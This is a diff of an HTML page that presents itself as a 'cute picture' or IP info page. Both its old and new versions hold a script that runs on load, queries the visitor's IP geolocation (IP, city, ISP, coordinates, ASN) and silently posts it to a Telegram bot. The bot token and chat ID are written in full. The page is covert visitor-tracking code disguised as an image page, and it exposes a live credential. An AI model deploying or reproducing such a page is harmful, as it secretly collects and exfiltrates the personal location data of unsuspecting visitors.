@@ -1,74 +1,63 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 	<head>
 		<meta charset="UTF-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0">
-		<title>可爱图片</title>
+		<title>IP 地理位置信息</title>
 	</head>
-	<img src="https://ymy.gay/https://cdn.jsdelivr.net/gh/png-dot/pngpng@main/20231005-220130-nmt89k.jpeg" alt="描述图片的文本"
-		style="width: 100%; height: 100%;">
 	<body>
+		<img src="https://ymy.gay/https://cdn.jsdelivr.net/gh/png-dot/pngpng@main/20231005-220130-nmt89k.jpeg"
+			alt="描述图片的文本" style="width: 100%; height: 100%;">
+
 		<script>
-			async function sendTelegramMessage(message) {
-				try {
-					const botToken = '5975737743:AAFxFhwL8_VIvZRkqXYeDVngTH3zXaqhy68'; // 替换为您的Telegram Bot的API令牌
-					const chatId = '5957163999'; // 替换为您的Telegram聊天ID
-
-					const apiUrl = `https://ymy.gay/https://api.telegram.org/bot${botToken}/sendMessage`;
-					const requestOptions = {
-						method: 'POST',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							chat_id: chatId,
-							text: message,
-						}),
-					};
-
-					const response = await fetch(apiUrl, requestOptions);
-					const data = await response.json();
-
-					// 输出Telegram API响应到控制台
-					console.log('Telegram API 响应:', data);
-
-					if (data.ok) {
-						console.log('消息发送成功。');
-					} else {
-						console.error('消息发送失败:', data);
-					}
-				} catch (error) {
-					console.error('消息发送失败:', error);
-				}
-			}
-
-			async function fetchVisitorInfo() {
-				try {
-					const response = await fetch('https://api.ip.sb/geoip');
-					const data = await response.json();
-
-					// 构建访问者信息消息
-					const visitorInfoMessage = `
-访问者信息:
-IP地址: ${data.ip}
-地理位置: ${data.city}, ${data.region}, ${data.country}
-ISP: ${data.isp}
-邮政编码: ${data.postal_code}
-国家代码: ${data.country_code}
+			// 使用 JavaScript 发送请求到 API 并将响应信息推送到 Telegram
+			fetch('https://api.ip.sb/geoip')
+				.then(response => response.json())
+				.then(data => {
+					// 构建要推送到 Telegram 的消息
+					const message = `
+                    IP 地址: ${data.ip}
+                    组织名称: ${data.organization}
+                    经度: ${data.longitude}
+                    城市: ${data.city}
+                    时区: ${data.timezone}
+                    ISP: ${data.isp}
+                    偏移量: ${data.offset}
+                    区域: ${data.region}
+                    ASN: ${data.asn}
+                    ASN 组织: ${data.asn_organization}
+                    国家: ${data.country}
+                    IP 地址: ${data.ip}
+                    纬度: ${data.latitude}
+                    大洲代码: ${data.continent_code}
+                    国家代码: ${data.country_code}
+                    区域代码: ${data.region_code}
                 `;
 
-					// 输出访问者信息到控制台
-					console.log('访问者信息:', visitorInfoMessage);
+					// 将消息推送到 Telegram
+					const token = '5975737743:AAFxFhwL8_VIvZRkqXYeDVngTH3zXaqhy68'; // 替换为您的 Telegram Bot API 令牌
+					const chatId = '5957163999'; // 替换为您的 Telegram 聊天 ID
 
-					// 调用sendTelegramMessage发送消息
-					await sendTelegramMessage(visitorInfoMessage);
-				} catch (error) {
-					console.error('获取访问者信息失败:', error);
-				}
-			}
-
-			// 在页面加载时调用fetchVisitorInfo
-			window.addEventListener('load', fetchVisitorInfo);
+					fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+							method: 'POST',
+							headers: {
+								'Content-Type': 'application/json'
+							},
+							body: JSON.stringify({
+								chat_id: chatId,
+								text: message
+							})
+						})
+						.then(response => response.json())
+						.then(responseData => {
+							console.log('消息已成功推送到 Telegram:', responseData);
+						})
+						.catch(error => {
+							console.error('推送到 Telegram 时发生错误：', error);
+						});
+				})
+				.catch(error => {
+					console.error('发生错误：', error);
+				});
 		</script>
 	</body>
 </html>
